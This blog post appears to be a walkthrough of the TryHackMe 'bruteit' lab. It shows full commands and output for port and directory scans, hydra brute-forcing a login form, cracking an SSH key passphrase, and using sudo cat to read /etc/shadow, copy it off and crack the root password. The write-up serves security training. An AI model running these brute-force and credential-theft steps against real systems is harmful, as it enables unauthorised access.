<!doctype html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.3.2" /><meta property="og:title" content="THM:bruteit" /><meta name="author" content="r0bsec" /><meta property="og:locale" content="en" /><meta name="description" content="bruteit" /><meta property="og:description" content="bruteit" /><link rel="canonical" href="https://r0bsec.github.io/writeups/bruteit/" /><meta property="og:url" content="https://r0bsec.github.io/writeups/bruteit/" /><meta property="og:site_name" content="r0bsec" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-08-17T22:44:52+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="THM:bruteit" /><meta name="twitter:site" content="@" /><meta name="twitter:creator" content="@r0bsec" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"r0bsec"},"dateModified":"2023-08-17T22:44:52+00:00","datePublished":"2023-08-17T22:44:52+00:00","description":"bruteit","headline":"THM:bruteit","mainEntityOfPage":{"@type":"WebPage","@id":"https://r0bsec.github.io/writeups/bruteit/"},"url":"https://r0bsec.github.io/writeups/bruteit/"}</script><title>THM:bruteit | r0bsec</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="r0bsec"><meta name="application-name" content="r0bsec"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.0/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.21.0/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"><body><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper"> <a href="/" id="avatar" class="rounded-circle"> <img src="/assets/img/favicons/favicon-32x32.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"> </a><div class="site-title"> <a href="/">r0bsec</a></div><div class="site-subtitle fst-italic">Cybersecurity fun and games</div></div><ul class="nav flex-column flex-grow-1 w-100 ps-0"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle"></i> <span>ABOUT</span> </a><li class="nav-item"> <a href="/writeups/" class="nav-link"> <i class="fa-fw fas fa-info-circle"></i> <span>WRITEUPS</span> </a></ul><div class="sidebar-bottom d-flex flex-wrap align-items-center w-100"> <a href="https://github.com/r0bsec" aria-label="github" target="_blank" rel="noopener noreferrer" > <i class="fab fa-github"></i> </a> <a href="https://twitter.com/" aria-label="twitter" target="_blank" rel="noopener noreferrer" > <i class="fab fa-twitter"></i> </a> <a href="javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container px-xxl-5"><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100" > <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>THM:bruteit</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> THM:bruteit</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </span> <span id="search-cancel">Cancel</span></div></div><div class="row mb-5"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pe-xl-4"><div class="post px-1 px-md-2"><h1 class="dynamic-title"> THM:bruteit</h1><div class="post-content"><p>bruteit</p><p>URL: <a href="https://tryhackme.com/room/bruteit">https://tryhackme.com/room/bruteit</a> [Easy]</p><hr /><h2 id="reconnaissance"><span class="me-2">Reconnaissance</span><a href="#reconnaissance" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Description of the room:</p><blockquote><p>Learn how to brute, hash cracking and escalate privileges in this box!</p></blockquote><h2 id="scanning"><span class="me-2">Scanning</span><a href="#scanning" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="running-nmap"><span class="me-2">Running: <code class="language-plaintext highlighter-rouge">nmap</code></span><a href="#running-nmap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Ran the following:</p><blockquote><p><code class="language-plaintext highlighter-rouge">nmap -sCV x.x.x.x</code></p></blockquote><p>Interesting ports found to be open:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="n">PORT</span>   <span class="n">STATE</span> <span class="n">SERVICE</span> <span class="n">VERSION</span>
<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ssh</span>     <span class="n">OpenSSH</span> <span class="mf">7.6</span><span class="n">p1</span> <span class="n">Ubuntu</span> <span class="mi">4</span><span class="n">ubuntu0</span><span class="p">.</span><span class="mi">3</span> <span class="p">(</span><span class="n">Ubuntu</span> <span class="n">Linux</span><span class="p">;</span> <span class="n">protocol</span> <span class="mf">2.0</span><span class="p">)</span>
<span class="o">|</span> <span class="n">ssh</span><span class="o">-</span><span class="n">hostkey</span><span class="p">:</span> 
<span class="o">|</span>   <span class="mi">2048</span> <span class="mi">4</span><span class="n">b</span><span class="p">:</span><span class="mi">0</span><span class="n">e</span><span class="p">:</span><span class="n">bf</span><span class="p">:</span><span class="mi">14</span><span class="p">:</span><span class="n">fa</span><span class="p">:</span><span class="mi">54</span><span class="p">:</span><span class="n">b3</span><span class="p">:</span><span class="mi">5</span><span class="n">c</span><span class="p">:</span><span class="mi">44</span><span class="p">:</span><span class="mi">15</span><span class="p">:</span><span class="n">ed</span><span class="p">:</span><span class="n">b2</span><span class="p">:</span><span class="mi">5</span><span class="n">d</span><span class="p">:</span><span class="n">a0</span><span class="p">:</span><span class="n">ac</span><span class="p">:</span><span class="mi">8</span><span class="nf">f </span><span class="p">(</span><span class="n">RSA</span><span class="p">)</span>
<span class="o">|</span>   <span class="mi">256</span> <span class="n">d0</span><span class="p">:</span><span class="mi">3</span><span class="n">a</span><span class="p">:</span><span class="mi">81</span><span class="p">:</span><span class="mi">55</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="mi">5</span><span class="n">e</span><span class="p">:</span><span class="mi">87</span><span class="p">:</span><span class="mi">0</span><span class="n">c</span><span class="p">:</span><span class="n">e8</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">1</span><span class="n">e</span><span class="p">:</span><span class="n">cf</span><span class="p">:</span><span class="mi">44</span><span class="p">:</span><span class="n">e0</span><span class="p">:</span><span class="mi">3</span><span class="n">a</span><span class="p">:</span><span class="mi">54</span> <span class="p">(</span><span class="n">ECDSA</span><span class="p">)</span>
<span class="o">|</span><span class="n">_</span>  <span class="mi">256</span> <span class="n">da</span><span class="p">:</span><span class="n">ce</span><span class="p">:</span><span class="mi">79</span><span class="p">:</span><span class="n">e0</span><span class="p">:</span><span class="mi">45</span><span class="p">:</span><span class="n">eb</span><span class="p">:</span><span class="mi">17</span><span class="p">:</span><span class="mi">25</span><span class="p">:</span><span class="n">ef</span><span class="p">:</span><span class="mi">62</span><span class="p">:</span><span class="n">ac</span><span class="p">:</span><span class="mi">98</span><span class="p">:</span><span class="n">f0</span><span class="p">:</span><span class="n">cf</span><span class="p">:</span><span class="n">bb</span><span class="p">:</span><span class="mi">04</span> <span class="p">(</span><span class="n">ED25519</span><span class="p">)</span>
<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>    <span class="n">Apache</span> <span class="n">httpd</span> <span class="mf">2.4</span><span class="p">.</span><span class="mi">29</span> <span class="p">((</span><span class="n">Ubuntu</span><span class="p">))</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">Apache2</span> <span class="n">Ubuntu</span> <span class="n">Default</span> <span class="n">Page</span><span class="p">:</span> <span class="n">It</span> <span class="n">works</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span> <span class="n">Apache</span><span class="o">/</span><span class="mf">2.4</span><span class="p">.</span><span class="mi">29</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span>
</pre></table></code></div></div><p>Also see: <a href="nmap.log">nmap.log</a></p><h3 id="running-gobuster"><span class="me-2">Running: <code class="language-plaintext highlighter-rouge">gobuster</code></span><a href="#running-gobuster" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Ran the following:</p><blockquote><p><code class="language-plaintext highlighter-rouge">gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://x.x.x.x</code></p></blockquote><p>Interesting folders found:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="o">/</span><span class="nf">admin                </span><span class="p">(</span><span class="n">Status</span><span class="p">:</span> <span class="mi">301</span><span class="p">)</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">314</span><span class="p">]</span> <span class="p">[</span><span class="o">--&gt;</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10</span><span class="p">.</span><span class="mf">176.145</span><span class="o">/</span><span class="n">admin</span><span class="o">/</span><span class="p">]</span>
<span class="o">/</span><span class="n">server</span><span class="o">-</span><span class="nf">status        </span><span class="p">(</span><span class="n">Status</span><span class="p">:</span> <span class="mi">403</span><span class="p">)</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">278</span><span class="p">]</span>
<span class="o">/</span><span class="nf">panel                </span><span class="p">(</span><span class="n">Status</span><span class="p">:</span> <span class="mi">301</span><span class="p">)</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">320</span><span class="p">]</span> <span class="p">[</span><span class="o">--&gt;</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10</span><span class="p">.</span><span class="mf">176.145</span><span class="o">/</span><span class="n">admin</span><span class="o">/</span><span class="n">panel</span><span class="o">/</span><span class="p">]</span>
</pre></table></code></div></div><p>Also see: <a href="gobuster.log">gobuster.log</a> and <a href="gobuster-admin.log">gobuster-admin.log</a></p><h3 id="running-nikto"><span class="me-2">Running: <code class="language-plaintext highlighter-rouge">nikto</code></span><a href="#running-nikto" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Ran the following:</p><blockquote><p><code class="language-plaintext highlighter-rouge">nikto -h x.x.x.x</code></p></blockquote><p>Interesting info found:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">TBD</span>                                   
</pre></table></code></div></div><p>Also see: <a href="nikto.log">nikto.log</a></p><h3 id="running-hydra"><span class="me-2">Running: <code class="language-plaintext highlighter-rouge">hydra</code></span><a href="#running-hydra" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>When we see that <code class="language-plaintext highlighter-rouge">gobuster</code> found a <code class="language-plaintext highlighter-rouge">/admin/</code> URL, we View Source of the page and see that the username is <code class="language-plaintext highlighter-rouge">admin</code>. So, for giggles, lets send <code class="language-plaintext highlighter-rouge">hydra</code> trying the RockYou passwords for account <code class="language-plaintext highlighter-rouge">admin</code> on that login form:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>hydra <span class="nt">-l</span> admin <span class="nt">-P</span> /usr/share/wordlists/rockyou.txt <span class="se">\</span>
    <span class="nv">$TARGET</span> http-post-form <span class="se">\</span>
    <span class="s2">"/admin/:user=^USER^&amp;pass=^PASS^:F=invalid"</span> <span class="nt">-I</span> 2&gt;&amp;1 | <span class="nb">tee</span> <span class="nv">$ROOM</span>/hydra.log
</pre></table></code></div></div><p>Sure enough, we find the password:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>Hydra v9.5 <span class="o">(</span>c<span class="o">)</span> 2023 by van Hauser/THC &amp; David Maciejak - Please <span class="k">do </span>not use <span class="k">in </span>military or secret service organizations, or <span class="k">for </span>illegal purposes <span class="o">(</span>this is non-binding, these <span class="k">***</span> ignore laws and ethics anyway<span class="o">)</span><span class="nb">.</span>

Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> starting at 2023-08-12 20:54:34
<span class="o">[</span>DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries <span class="o">(</span>l:1/p:14344399<span class="o">)</span>, ~896525 tries per task
<span class="o">[</span>DATA] attacking http-post-form://10.10.176.145:80/admin/:user<span class="o">=</span>^USER^&amp;pass<span class="o">=</span>^PASS^:F<span class="o">=</span>invalid
<span class="o">[</span>80][http-post-form] host: 10.10.176.145   login: admin   password: <span class="k">******</span>
1 of 1 target successfully completed, 1 valid password found
Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> finished at 2023-08-12 20:55:02
</pre></table></code></div></div><p>We can now log into the <code class="language-plaintext highlighter-rouge">/admin/</code> website portal where we have an <code class="language-plaintext highlighter-rouge">id_rsa</code> file, and also the web flag for the TryHackMe room. We also get a potential username <code class="language-plaintext highlighter-rouge">john</code>.</p><p>Also see: <a href="hydra.log">hydra.log</a> and <a href="id_rsa.txt">id_rsa.txt</a></p><h3 id="john-the-ripper"><span class="me-2">John the Ripper</span><a href="#john-the-ripper" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>We have an <code class="language-plaintext highlighter-rouge">id_rsa</code> file that is password-protected. We need to get the file into a format that John the Ripper can use, so we run:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>ssh2john ./id_rsa.txt <span class="o">&gt;</span> id_rsa.hash
</pre></table></code></div></div><p>Now we can run John the Ripper using the “RockYou” wordlist and see if we can crack this password:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt ./id_rsa.hash 
</pre></table></code></div></div><p>And sure enough, we find the password:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>SSH, SSH private key <span class="o">[</span>RSA/DSA/EC/OPENSSH 32/64]<span class="o">)</span>
Cost 1 <span class="o">(</span>KDF/cipher <span class="o">[</span><span class="nv">0</span><span class="o">=</span>MD5/AES <span class="nv">1</span><span class="o">=</span>MD5/3DES <span class="nv">2</span><span class="o">=</span>Bcrypt/AES]<span class="o">)</span> is 0 <span class="k">for </span>all loaded hashes
Cost 2 <span class="o">(</span>iteration count<span class="o">)</span> is 1 <span class="k">for </span>all loaded hashes
Will run 8 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
<span class="k">**********</span>       <span class="o">(</span>./id_rsa.txt<span class="o">)</span>     
1g 0:00:00:00 DONE <span class="o">(</span>2023-08-12 21:07<span class="o">)</span> 25.00g/s 1816Kp/s 1816Kc/s 1816KC/s saloni..rashon
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed. 
</pre></table></code></div></div><p>We can now use that to try to SSH in, and we get in, but immediately get kicked out!</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nv">$ </span>ssh admin@<span class="nv">$TARGET</span> <span class="nt">-i</span> ./id_rsa.txt                   

Enter passphrase <span class="k">for </span>key <span class="s1">'./id_rsa.txt'</span>: 
Connection closed by 10.10.176.145 port 22
</pre></table></code></div></div><p>We try again with the username <code class="language-plaintext highlighter-rouge">john</code> from the main “Panel” page we found and we get in!</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="nv">$ </span>ssh john@<span class="nv">$TARGET</span> <span class="nt">-i</span> ./id_rsa.txt

Enter passphrase <span class="k">for </span>key <span class="s1">'./id_rsa.txt'</span>: 
Welcome to Ubuntu 18.04.4 LTS <span class="o">(</span>GNU/Linux 4.15.0-118-generic x86_64<span class="o">)</span>

 <span class="k">*</span> Documentation:  https://help.ubuntu.com
 <span class="k">*</span> Management:     https://landscape.canonical.com
 <span class="k">*</span> Support:        https://ubuntu.com/advantage

  System information as of Sun Aug 13 01:13:30 UTC 2023

  System load:  0.0                Processes:           109
  Usage of /:   25.8% of 19.56GB   Users logged <span class="k">in</span>:     0
  Memory usage: 46%                IP address <span class="k">for </span>eth0: 10.10.176.145
  Swap usage:   0%


63 packages can be updated.
0 updates are security updates.


Last login: Wed Sep 30 14:06:18 2020 from 192.168.1.106
john@bruteit:~<span class="err">$</span>
</pre></table></code></div></div><h2 id="gaining-access"><span class="me-2">Gaining Access</span><a href="#gaining-access" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We investigated various avenues but ultimately SSH’ing in as <code class="language-plaintext highlighter-rouge">john</code> with the <code class="language-plaintext highlighter-rouge">id_rsa</code> SSH key, and the password for that file discovered by John the Ripper was the way in.</p><h3 id="unprivileged-access"><span class="me-2">Unprivileged Access</span><a href="#unprivileged-access" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Now that we’re SSH’ed in as <code class="language-plaintext highlighter-rouge">john</code> we can see the <code class="language-plaintext highlighter-rouge">user.txt</code> flag needed for the TryHackMe room.</p><p>It we run a <code class="language-plaintext highlighter-rouge">sudo -l</code>, we can see we can run <code class="language-plaintext highlighter-rouge">cat</code> as <code class="language-plaintext highlighter-rouge">sudo</code>!</p><h2 id="privilege-escalation"><span class="me-2">Privilege Escalation</span><a href="#privilege-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>When we run a <code class="language-plaintext highlighter-rouge">sudo -l</code>, we see:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>Matching Defaults entries <span class="k">for </span>john on bruteit:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User john may run the following commands on bruteit:
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /bin/cat
</pre></table></code></div></div><p>We can of course do something like:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">sudo cat</span> /root/root.txt
</pre></table></code></div></div><p>to get the root flag and finish the room, but we haven’t actually rooted the box yet!</p><h3 id="cracking-the-etcpasswd"><span class="me-2">Cracking the <code class="language-plaintext highlighter-rouge">/etc/passwd</code></span><a href="#cracking-the-etcpasswd" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Since we will have access to see the contents of <code class="language-plaintext highlighter-rouge">/etc/passwd</code> and the <code class="language-plaintext highlighter-rouge">/etc/shadow</code>, then we might see if we can crack the passwords for the accounts on that box. First, on the target machine exfiltrate the contents of those files and put them in a common place:</p><h4 id="target-machine"><span class="me-2">Target Machine:</span><a href="#target-machine" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nb">sudo cat</span> /etc/passwd <span class="o">&gt;</span> /tmp/passwd
<span class="nb">sudo cat</span> /etc/shadow <span class="o">&gt;</span> /tmp/shadow
</pre></table></code></div></div><h4 id="your-workstation"><span class="me-2">Your Workstation:</span><a href="#your-workstation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Then on your workstation, use SCP for example to go get those files from the target machine:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>scp <span class="nt">-i</span> ./id_rsa.txt john@<span class="nv">$TARGET</span>:/tmp/passwd ./
scp <span class="nt">-i</span> ./id_rsa.txt john@<span class="nv">$TARGET</span>:/tmp/shadow ./
</pre></table></code></div></div><p>You can now merge <code class="language-plaintext highlighter-rouge">passwd</code> and <code class="language-plaintext highlighter-rouge">shadow</code> and make them one file, like it used to be in the olden days of Unix, with <code class="language-plaintext highlighter-rouge">unshadow</code>:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>unshadow ./passwd ./shadow <span class="o">&gt;</span> ./combined.txt
</pre></table></code></div></div><p>Finally, let’s have John the Ripper see if he can crack these passwords, and we’ll use the RockYou wordlist again:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt ./combined.txt
</pre></table></code></div></div><p>And right away we get the <code class="language-plaintext highlighter-rouge">root</code> password:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts <span class="o">(</span>sha512crypt, crypt<span class="o">(</span>3<span class="o">)</span> <span class="nv">$6$ </span><span class="o">[</span>SHA512 256/256 AVX2 4x]<span class="o">)</span>
Cost 1 <span class="o">(</span>iteration count<span class="o">)</span> is 5000 <span class="k">for </span>all loaded hashes
Will run 8 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
<span class="k">********</span>         <span class="o">(</span>root<span class="o">)</span> 
1g 0:00:01:54 1.70% <span class="o">(</span>ETA: 23:30:33<span class="o">)</span> 0.008738g/s 2487p/s 4983c/s 4983C/s 1stson..141710
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session aborted
</pre></table></code></div></div><p>I let it run for a few more minutes and it didn’t find any others. With the <code class="language-plaintext highlighter-rouge">root</code> password we can just run <code class="language-plaintext highlighter-rouge">su</code> and type in the root password, and then we have a <code class="language-plaintext highlighter-rouge">root</code> prompt!</p><p>See also: <a href="combined.txt">combined.txt</a>, <a href="passwd">passwd</a>, and <a href="shadow">shadow</a>.</p><h2 id="summary"><span class="me-2">Summary</span><a href="#summary" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Completed: [2023-08-12 21:44:16]</p></div></div></div><div id="panel-wrapper" class="col-xl-3 ps-2 text-muted"><div class="access"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/chirpy/">chirpy</a> <a class="post-tag btn btn-outline-primary" href="/tags/documentation/">documentation</a> <a class="post-tag btn btn-outline-primary" href="/tags/jekyll/">jekyll</a> <a class="post-tag btn btn-outline-primary" href="/tags/techno-tim/">techno-tim</a></div></div></div></div></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/chirpy/">chirpy</a> <a class="post-tag btn btn-outline-primary" href="/tags/documentation/">documentation</a> <a class="post-tag btn btn-outline-primary" 